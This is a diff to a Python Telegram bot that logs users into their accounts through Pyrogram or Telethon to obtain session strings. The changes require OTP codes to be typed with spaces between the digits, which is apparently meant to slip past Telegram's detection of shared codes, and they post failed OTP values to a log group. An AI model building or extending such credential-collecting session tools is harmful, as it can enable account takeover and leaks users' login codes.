@@ -120,19 +120,24 @@ def validate_phone_number(phone: str) -> tuple[bool, str]:
     
     return True, "✅ Valid phone number format"
 
-# Enhanced OTP validation
+# Enhanced OTP validation - only accept "1 2 3 4 5" format
 def validate_otp_code(otp: str) -> tuple[bool, str]:
-    """Validate OTP code format with detailed feedback."""
+    """Validate OTP code format - only accepts space-separated format."""
     if not otp:
         return False, "🔢 Please enter the OTP code"
     
-    otp = otp.strip().replace(" ", "").replace("-", "")
+    otp_clean = otp.strip()
     
-    if not otp.isdigit():
-        return False, "🔢 OTP must contain only numbers\n\n🔸 Format: 12345 (5 digits)"
+    # Check if it's exactly in "1 2 3 4 5" format
+    parts = otp_clean.split(" ")
     
-    if len(otp) != 5:
-        return False, f"🔢 OTP must be exactly 5 digits\n\n🔸 You entered: {len(otp)} digits\n🔸 Required: 5 digits (12345)"
+    if len(parts) != 5:
+        return False, "🔢 Please use exactly this format: 1 2 3 4 5\n\n🔸 Example: 1 2 3 4 5\n🔸 Your code with spaces between each digit"
+    
+    # Check each part is a single digit
+    for part in parts:
+        if not part.isdigit() or len(part) != 1:
+            return False, "🔢 Each digit must be separated by space\n\n🔸 Correct format: 1 2 3 4 5\n🔸 Wrong format: 12345 or 12 34 5"
     
     return True, "✅ Valid OTP format"
 
@@ -475,15 +480,14 @@ async def handle_phone_number(update: Update, context: ContextTypes.DEFAULT_TYPE
         data['phone_number'] = phone_number
         data['step'] = 'otp'
         
-        # Enhanced OTP request message with format guidance
+        # Enhanced OTP request message with specific format requirement
         otp_message = f"""<b>✅ ᴏᴛᴘ ᴄᴏᴅᴇ sᴇɴᴛ ᴛᴏ {phone_number}
 
-🔢 ᴘʟᴇᴀsᴇ sᴇɴᴅ ᴛʜᴇ 5-ᴅɪɢɪᴛ ᴄᴏᴅᴇ:
+🔢 ᴘʟᴇᴀsᴇ sᴇɴᴅ ᴛʜᴇ ᴄᴏᴅᴇ ɪɴ ᴛʜɪs ғᴏʀᴍᴀᴛ:
 
-📝 ғᴏʀᴍᴀᴛ ᴇxᴀᴍᴘʟᴇs:
-• 12345
-• 1 2 3 4 5
-• 1-2-3-4-5
+📝 ʀᴇǫᴜɪʀᴇᴅ ғᴏʀᴍᴀᴛ: 1 2 3 4 5
+🔸 sᴘᴀᴄᴇs ʙᴇᴛᴡᴇᴇɴ ᴇᴀᴄʜ ᴅɪɢɪᴛ
+🔸 ᴇxᴀᴍᴘʟᴇ: 5 4 3 2 1
 
 ⏰ ᴄᴏᴅᴇ ᴇxᴘɪʀᴇs ɪɴ 10 ᴍɪɴᴜᴛᴇs</b>"""
         
@@ -523,11 +527,14 @@ async def handle_otp_code(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
     is_valid, validation_message = validate_otp_code(otp_code)
     if not is_valid:
         await update.message.reply_text(
-            f"<b>❌ ɪɴᴠᴀʟɪᴅ ᴏᴛᴘ ᴄᴏᴅᴇ\n\n{validation_message}</b>",
+            f"<b>❌ ɪɴᴠᴀʟɪᴅ ғᴏʀᴍᴀᴛ\n\n{validation_message}</b>",
             parse_mode=ParseMode.HTML
         )
-        await log_to_group(context, f"Invalid OTP attempt: {otp_code} by user {user_id}", "WARNING")
+        await log_to_group(context, f"Invalid OTP format attempt: {otp_code} by user {user_id}", "WARNING")
         return
+    
+    # Convert "1 2 3 4 5" to "12345" for API calls
+    otp_for_api = otp_code.replace(" ", "")
     
     if user_id not in session_data:
         await update.message.reply_text(
@@ -540,9 +547,9 @@ async def handle_otp_code(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
     
     try:
         if data['type'] == 'pyrogram':
-            await data['client'].sign_in(data['phone_number'], data['phone_hash'], otp_code)
+            await data['client'].sign_in(data['phone_number'], data['phone_hash'], otp_for_api)
         else:  # telethon
-            await data['client'].sign_in(data['phone_number'], otp_code)
+            await data['client'].sign_in(data['phone_number'], otp_for_api)
         
         # Get session string
         if data['type'] == 'pyrogram':
@@ -576,10 +583,21 @@ async def handle_otp_code(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
         )
     except Exception as e:
         logger.error(f"Error verifying OTP: {e}")
-        await update.message.reply_text(
-            "<b>❌ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ғᴀɪʟᴇᴅ\n\nᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ᴏʀ ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴄᴏᴅᴇ</b>",
-            parse_mode=ParseMode.HTML
-        )
+        
+        # Check if it's a 2FA error that wasn't caught properly
+        if "SESSION_PASSWORD_NEEDED" in str(e):
+            data['step'] = '2fa'
+            await update.message.reply_text(
+                "<b>🔐 2ғᴀ ᴇɴᴀʙʟᴇᴅ ᴀᴄᴄᴏᴜɴᴛ\n\nᴘʟᴇᴀsᴇ ᴇɴᴛᴇʀ ʏᴏᴜʀ 2ғᴀ ᴘᴀssᴡᴏʀᴅ</b>",
+                parse_mode=ParseMode.HTML
+            )
+            await log_to_group(context, f"2FA required for user {user_id} (caught in general exception)", "INFO")
+        else:
+            await update.message.reply_text(
+                "<b>❌ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ғᴀɪʟᴇᴅ\n\n🔢 ᴘʟᴇᴀsᴇ ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴄᴏᴅᴇ ғᴏʀᴍᴀᴛ:\n\n📝 ʀᴇǫᴜɪʀᴇᴅ: 1 2 3 4 5\n🔸 sᴘᴀᴄᴇs ʙᴇᴛᴡᴇᴇɴ ᴇᴀᴄʜ ᴅɪɢɪᴛ</b>",
+                parse_mode=ParseMode.HTML
+            )
+            await log_to_group(context, f"Technical error during OTP verification for user {user_id}: {str(e)}", "ERROR")
 
 async def handle_2fa_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     """Handle 2FA password verification with enhanced error handling."""
